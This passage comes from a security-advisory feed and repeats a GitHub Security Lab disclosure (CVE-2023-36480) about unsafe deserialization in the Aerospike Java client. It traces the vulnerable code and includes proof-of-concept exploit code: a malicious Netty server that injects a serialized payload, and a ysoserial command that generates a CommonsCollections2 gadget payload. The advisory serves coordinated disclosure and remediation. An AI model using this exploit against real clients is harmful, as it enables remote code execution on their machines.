        int size = 30 + name.length() + payload.length;
        int low = (byte) (size &amp; 0xFF);
        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;
        return new int[] {high, low};
    }

    public int getOpSize() {
        return payload.length + 4 + name.length();
    }

    public byte[] getPayload() {
        return payload;
    }
}
</code></pre>
<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>
<pre><code class="language-java">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {

    @Override
    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)
            throws Exception {
        // header
        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});
        int[] length = msg.getSize();
        out.writeByte(length[0]);
        out.writeByte(length[1]);

        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});
        out.writeByte(msg.getResultCode());
        out.writeInt(msg.getGeneration());
        out.writeInt(msg.getExpiration());

        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});
        out.writeShort(msg.getFieldCount());
        out.writeShort(msg.getOpCount());
        out.writeInt(msg.getOpSize());

        out.writeByte(0x01);
        out.writeByte(msg.getParticleType());

        out.writeByte(0x00);
        out.writeByte(msg.getName().length());
        out.writeCharSequence(msg.getName(), Charset.defaultCharset());
        out.writeBytes(msg.getPayload());
    }

}
</code></pre>
<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>
<pre><code class="language-xml">&lt;dependency&gt;
  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
  &lt;version&gt;4.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>In which case, the malicious payload file could be generated using <a href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a> as follows:</p>
<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin
</code></pre>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by the GitHub CodeQL team members <a href="https://github.com/atorralba">@atorralba (Tony Torralba)</a> and <a href="https://github.com/joefarebrother">@joefarebrother (Joseph Farebrother)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36480">https://nvd.nist.gov/vuln/detail/CVE-2023-36480</a></li>
<li><a href="https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses">https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a">https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae">https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36">https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36</a></li>
<li><a href="https://github.com/advisories/GHSA-jj95-55cr-9597">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj95-55cr-9597</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-08-03T19:45:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses]]></title>
        <id>https://github.com/advisories/GHSA-jj95-55cr-9597</id>
        <link href="https://github.com/advisories/GHSA-jj95-55cr-9597"/>
        <updated>2023-08-08T14:55:46.000Z</updated>
        <content type="html"><![CDATA[<h1 id="github-security-lab-ghsl-vulnerability-report-ghsl-2023-044">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href="https://github.com/aerospike/aerospike-client-java/">Aerospike Java Client</a>.</p>
<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>
<h2 id="product">Product</h2>
<p>Aerospike Java Client</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7">6.1.7</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-unsafe-deserialization-of-server-responses-ghsl-2023-044">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>
<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>
<pre><code class="language-java">@Override
public void channelRead(ChannelHandlerContext ctx, Object msg) {
    command.read((ByteBuf)msg);
}
</code></pre>
<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code — for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>
<pre><code class="language-java">private void read(ByteBuf byteBuffer) {
    eventReceived = true;

    try {
        switch (state) {
            // --snip--
            case AsyncCommand.COMMAND_READ_HEADER:
                if (command.isSingle) {
                    readSingleHeader(byteBuffer);
                }
                // --snip--
        }
        // --snip--
    }
    // --snip---
}
</code></pre>
<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>
<pre><code class="language-java">private void readSingleHeader(ByteBuf byteBuffer) {
    int readableBytes = byteBuffer.readableBytes();
    int dataSize = command.dataOffset + readableBytes;

    // --snip--

    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);
    command.dataOffset = dataSize;

    if (command.dataOffset &gt;= receiveSize) {
        parseSingleBody();
    }
}
</code></pre>
<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>
<pre><code class="language-java">@Override
protected final boolean parseResult() {
    validateHeaderSize();

    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;
    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);
    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);
    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);
    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);
    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;

    if (resultCode == 0) {
        // --snip--
        skipKey(fieldCount);
        record = parseRecord(opCount, generation, expiration, isOperation);
        return true;
    }
</code></pre>
<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>
<pre><code class="language-java">protected final Record parseRecord(
    int opCount,
    int generation,
    int expiration,
    boolean isOperation
)  {
    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();

    for (int i = 0 ; i &lt; opCount; i++) {
        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);
        byte particleType = dataBuffer[dataOffset + 5];
        byte nameSize = dataBuffer[dataOffset + 7];
        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);
        dataOffset += 4 + 4 + nameSize;

        int particleBytesSize = opSize - (4 + nameSize);
        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);
</code></pre>
<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>
<pre><code class="language-java">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)
    throws AerospikeException {
        switch (type) {
            // --snip--
            case ParticleType.JBLOB:
                return Buffer.bytesToObject(buf, offset, len);
</code></pre>
<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>
<pre><code class="language-java">public static Object bytesToObject(byte[] buf, int offset, int length) {
    // --snip--
    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {
        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
            return oistream.readObject();
        }
    }
    // --snip--
}
</code></pre>
<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>
<pre><code class="language-java">private T unpackBlob(int count) throws IOException, ClassNotFoundException {
    // --snip--
    case ParticleType.JBLOB:
        // --snip--
        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {
            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
                val = getJavaBlob(oistream.readObject());
            }
        }
</code></pre>
<p>This vulnerability was discovered with the help of <a href="https://codeql.github.com/">CodeQL</a>.</p>
<h4 id="impact">Impact</h4>
<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>
<h4 id="remediation">Remediation</h4>
<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>
<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>
<h4 id="resources">Resources</h4>
<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>
<pre><code class="language-java">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {
        // --snip--
        if (s.getBytes()[7] == 0x44) {
            AttackMessage m = new AttackMessage(
                    Files.readAllBytes(Paths.get("location/of/deserialization/payload.bin")));
            ctx.channel().writeAndFlush(m);
            return;
        }
        // --snip--
    }
}
</code></pre>
<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>
<pre><code class="language-java">public class AttackMessage {

    private byte resultCode = 0;
    private int generation = 2;
    private int expiration = 417523457;
    private short fieldCount = 0;
    private short opCount = 1;
    private byte particleType = 7;
    private String name = "putgetbin";
    private byte[] payload;

    public AttackMessage(byte[] payload) {
        this.payload = payload;
    }

    // --snip-- (getters)

    public int[] getSize() {
        int size = 30 + name.length() + payload.length;
        int low = (byte) (size &amp; 0xFF);
        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;
        return new int[] {high, low};
    }

    public int getOpSize() {
        return payload.length + 4 + name.length();
    }

    public byte[] getPayload() {
        return payload;
    }
}
</code></pre>
<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>
<pre><code class="language-java">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {

    @Override
    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)
            throws Exception {
        // header
        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});
        int[] length = msg.getSize();
        out.writeByte(length[0]);
        out.writeByte(length[1]);

        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});
        out.writeByte(msg.getResultCode());
        out.writeInt(msg.getGeneration());
        out.writeInt(msg.getExpiration());

        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});
        out.writeShort(msg.getFieldCount());
        out.writeShort(msg.getOpCount());
        out.writeInt(msg.getOpSize());

        out.writeByte(0x01);
        out.writeByte(msg.getParticleType());

        out.writeByte(0x00);
        out.writeByte(msg.getName().length());
        out.writeCharSequence(msg.getName(), Charset.defaultCharset());
        out.writeBytes(msg.getPayload());
    }

}
</code></pre>
<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>
<pre><code class="language-xml">&lt;dependency&gt;
  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
  &lt;version&gt;4.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>In which case, the malicious payload file could be generated using <a href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a> as follows:</p>
<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin
</code></pre>
<h2 id="github-security-advisories">GitHub Security Advisories</h2>
<p>We recommend you create a private <a href="https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href="https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory">published</a>.</p>
<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by the GitHub CodeQL team members <a href="https://github.com/atorralba">@atorralba (Tony Torralba)</a> and <a href="https://github.com/joefarebrother">@joefarebrother (Joseph Farebrother)</a>.</p>
<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36480">https://nvd.nist.gov/vuln/detail/CVE-2023-36480</a></li>
<li><a href="https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses">https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a">https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae">https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae</a></li>
<li><a href="https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36">https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36</a></li>
<li><a href="https://github.com/advisories/GHSA-jj95-55cr-9597">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jj95-55cr-9597</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-08-03T19:45:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses]]></title>
        <id>https://github.com/advisories/GHSA-jj95-55cr-9597</id>
        <link href="https://github.com/advisories/GHSA-jj95-55cr-9597"/>
        <updated>2023-08-08T14:55:46.000Z</updated>
        <content type="html"><![CDATA[<h1 id="github-security-lab-ghsl-vulnerability-report-ghsl-2023-044">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>
<p>The <a href="https://securitylab.github.com">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href="https://github.com/aerospike/aerospike-client-java/">Aerospike Java Client</a>.</p>
<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>
<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>
<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>
<h2 id="summary">Summary</h2>
<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>
<h2 id="product">Product</h2>
<p>Aerospike Java Client</p>
<h2 id="tested-version">Tested Version</h2>
<p><a href="https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7">6.1.7</a></p>
<h2 id="details">Details</h2>
<h3 id="issue-unsafe-deserialization-of-server-responses-ghsl-2023-044">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>
<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>
<pre><code class="language-java">@Override
public void channelRead(ChannelHandlerContext ctx, Object msg) {
    command.read((ByteBuf)msg);
}
</code></pre>
<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code — for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>
<pre><code class="language-java">private void read(ByteBuf byteBuffer) {
    eventReceived = true;

    try {
        switch (state) {
            // --snip--
            case AsyncCommand.COMMAND_READ_HEADER:
                if (command.isSingle) {
                    readSingleHeader(byteBuffer);
                }
                // --snip--
        }
        // --snip--
    }
    // --snip---
}
</code></pre>
<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>
<pre><code class="language-java">private void readSingleHeader(ByteBuf byteBuffer) {
    int readableBytes = byteBuffer.readableBytes();
    int dataSize = command.dataOffset + readableBytes;

    // --snip--

    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);
    command.dataOffset = dataSize;

    if (command.dataOffset &gt;= receiveSize) {
        parseSingleBody();
    }
}
</code></pre>
<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>
<pre><code class="language-java">@Override
protected final boolean parseResult() {
    validateHeaderSize();

    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;
    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);
    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);
    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);
    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);
    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;

    if (resultCode == 0) {
        // --snip--
        skipKey(fieldCount);
        record = parseRecord(opCount, generation, expiration, isOperation);
        return true;
    }
</code></pre>
<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>
<p><a href="https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>
<pre><code class="language-java">protected final Record parseRecord(
    int opCount,
